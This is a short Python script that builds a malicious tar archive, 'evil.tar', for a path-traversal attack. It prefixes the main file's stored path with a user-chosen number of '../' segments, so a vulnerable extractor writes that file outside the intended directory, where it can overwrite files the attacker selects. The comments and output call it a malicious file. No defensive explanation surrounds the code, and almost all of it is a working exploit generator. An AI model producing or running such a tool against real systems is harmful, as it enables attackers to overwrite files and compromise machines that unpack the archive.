import sys
import tarfile
import os

# setup files

args = sys.argv
args.pop(0)
backtracks = args[0]
args.pop(0)
mainfile = args[0]
args.pop(0)
otherfiles = args

# see if files exist
if not os.path.exists(mainfile):
    open(mainfile,"w").write("")
    print(mainfile+" not found, creating")
for file in otherfiles:
    if not os.path.exists(file):
        print(file+" not found, creating")
        open(file,"w").write("")

# make malicious file
def makemaltar(mainfile,otherfiles):
    print("[+] Creating TAR file")
    tf = tarfile.open("evil.tar",'w')
    tf.add(mainfile,"../" * int(backtracks) + mainfile)
    print("[+] Added mal file")
    for file in otherfiles:
        tf.add(file,file)
        print("[+] Added other file")
    tf.close()

makemaltar(mainfile,otherfiles)
